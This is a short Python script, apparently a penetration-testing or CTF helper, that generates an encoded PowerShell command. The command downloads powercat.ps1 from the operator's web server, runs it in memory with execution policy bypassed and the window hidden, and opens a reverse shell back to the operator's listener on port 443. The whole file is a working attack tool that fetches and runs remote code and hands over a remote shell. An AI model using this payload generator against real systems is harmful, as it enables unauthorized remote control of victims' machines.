#!/usr/bin/env python3

"""
Script to generate a base64-encoded powershell payload that tells the victim
to download powercat.ps1 from your webserver and invoke it to your listener.
"""

import socket
import fcntl
import struct
import base64
import sys

LPORT = 443

payload_template = """\
        IEX(New-Object System.Net.WebClient).DownloadString('http://{laddr}:8000/powercat.ps1');\
powercat -c {laddr} -p {lport} -e powershell\
"""
caller_template = "powershell -nop -noni -exec bypass -w hidden -enc {payload}"

# source: https://stackoverflow.com/a/24196955/5202294
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack("256s", ifname[:15].encode())
    )[20:24])

if __name__ == "__main__":
    laddr = get_ip_address("tun0")
    payload = payload_template.format(laddr=laddr,lport=LPORT)
    print("[*] base64-encoded payload:", file=sys.stderr)
    print(f"[*] {payload}", file=sys.stderr)
    payload = base64.b64encode(payload.encode("utf-16le")).decode()
    caller = caller_template.format(payload=payload)
    print(caller)

